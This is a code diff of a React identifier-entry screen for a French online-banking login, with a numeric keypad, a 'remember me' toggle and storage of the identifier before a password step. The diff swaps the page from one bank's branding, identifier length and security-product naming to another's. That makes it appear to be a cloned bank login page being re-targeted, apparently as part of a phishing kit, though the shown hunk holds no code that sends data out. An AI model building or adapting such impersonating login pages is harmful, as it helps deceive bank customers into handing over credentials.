@@ -9,7 +9,7 @@ const IdentifierStep = () => {
   const [rememberMe, setRememberMe] = useState(false);
 
   const handleNumberClick = (num) => {
-    if (identifier.length < 8) {
+    if (identifier.length < 10) {
       setIdentifier(identifier + num);
     }
   };
@@ -19,8 +19,8 @@ const IdentifierStep = () => {
   };
 
   const handleSubmit = () => {
-    if (identifier.length === 8) {
-      sessionStorage.setItem('securipass_identifier', identifier);
+    if (identifier.length === 10) {
+      sessionStorage.setItem('certicode_identifier', identifier);
       navigate('/password-step');
     }
   };
@@ -28,32 +28,32 @@ const IdentifierStep = () => {
   return (
     <div className="min-h-screen bg-white py-8 px-4" data-testid="identifier-step">
       <div className="max-w-md mx-auto">
-        <div className="mb-8">
-          <p className="text-gray-600 text-sm mb-2">Saisissez votre identifiant client</p>
+        <div className="mb-6">
+          <h2 className="text-xl font-bold text-gray-900 mb-2">Connexion à votre espace client</h2>
+          <p className="text-gray-600 text-sm">Identifiant (10 chiffres)</p>
         </div>
 
         <NumericKeypad
           value={identifier}
-          maxLength={8}
+          maxLength={10}
           onNumberClick={handleNumberClick}
           onDelete={handleDelete}
           onSubmit={handleSubmit}
-          submitLabel="Valider"
+          submitLabel="Continuer"
           showAsDashes={false}
-          inputLabel=""
         />
 
-        {/* Se souvenir de moi */}
+        {/* Mémoriser mon identifiant */}
         <div className="flex items-center gap-3 mt-6">
-          <span className="text-gray-600 text-sm">Se souvenir de moi</span>
-          <button className="text-[#1a2b6d]" data-testid="info-remember-btn">
+          <span className="text-gray-600 text-sm">Mémoriser mon identifiant</span>
+          <button className="text-[#003DA5]" data-testid="info-remember-btn">
             <Info size={18} />
           </button>
           <button
             onClick={() => setRememberMe(!rememberMe)}
             data-testid="remember-me-toggle"
             className={`relative w-12 h-6 rounded-full transition-colors duration-200 ${
-              rememberMe ? 'bg-[#1a2b6d]' : 'bg-gray-300'
+              rememberMe ? 'bg-[#003DA5]' : 'bg-gray-300'
             }`}
           >
             <span
@@ -65,10 +65,9 @@ const IdentifierStep = () => {
         </div>
 
         <div className="mt-8 text-center">
-          <p className="text-sm text-gray-500">
-            Besoin d'aide ? Contactez le{' '}
-            <span className="font-semibold text-[#e60028]">09 69 39 00 00</span>
-          </p>
+          <a href="#" className="text-[#003DA5] hover:underline text-sm font-medium" data-testid="forgot-id-link">
+            Identifiant oublié ?
+          </a>
         </div>
       </div>
     </div>
